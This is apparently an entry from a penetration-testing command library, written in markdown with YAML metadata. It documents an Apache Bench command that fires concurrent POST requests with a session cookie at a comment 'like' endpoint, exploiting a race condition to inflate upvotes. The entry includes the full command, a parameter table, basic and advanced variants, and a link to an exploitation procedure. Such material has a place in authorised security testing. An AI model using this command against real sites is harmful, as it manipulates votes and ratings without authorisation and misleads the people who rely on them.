---
data: >-
  ab -n 10 -c 10 -p postdata.txt -T application/x-www-form-urlencoded -H
  "Cookie: session=abc123" https://target.com/reviews/comment/123/like
tags:
  - race-condition
  - http
  - benchmark
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-05T12:00:00Z'
updated_at: '2025-12-14T17:24:22.838Z'
id: 52b9f42e-3183-4c26-b540-94761ec86ae8
verified: false
validated: true
submitted: true
---
# concurrent-like-requests

## Command

```bash
ab -n 10 -c 10 -p postdata.txt -T application/x-www-form-urlencoded -H "Cookie: session=abc123" https://target.com/reviews/comment/123/like
```

## Description

This command uses Apache Bench (ab) to send multiple concurrent POST requests to a like endpoint, exploiting race conditions by simulating simultaneous user actions to inflate upvotes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-n 10` | Total number of requests to perform | Yes |
| `-c 10` | Number of concurrent requests | Yes |
| `-p postdata.txt` | File containing POST data | Yes |
| `-T application/x-www-form-urlencoded` | Content-Type header | Yes |
| `-H "Cookie: session=abc123"` | Authentication cookie | Yes |
| `https://target.com/reviews/comment/123/like` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
ab -n 5 -c 5 -p like.txt https://example.com/like
```

### Advanced Usage

```bash
ab -n 20 -c 10 -p postdata.txt -T application/x-www-form-urlencoded -H "Cookie: session=abc123; User-Agent: Mozilla/5.0" https://target.com/comment/123/like
```

## Expected Output

Benchmarking output showing request times, failure rates, and success counts, e.g., "Complete requests: 10, Failed requests: 0". Verify inflation separately via UI or API.

## Related

- [[commands/check-upvote-count]]
- [[procedures/Exploit-Race-Condition-in-Comments-Likes]]
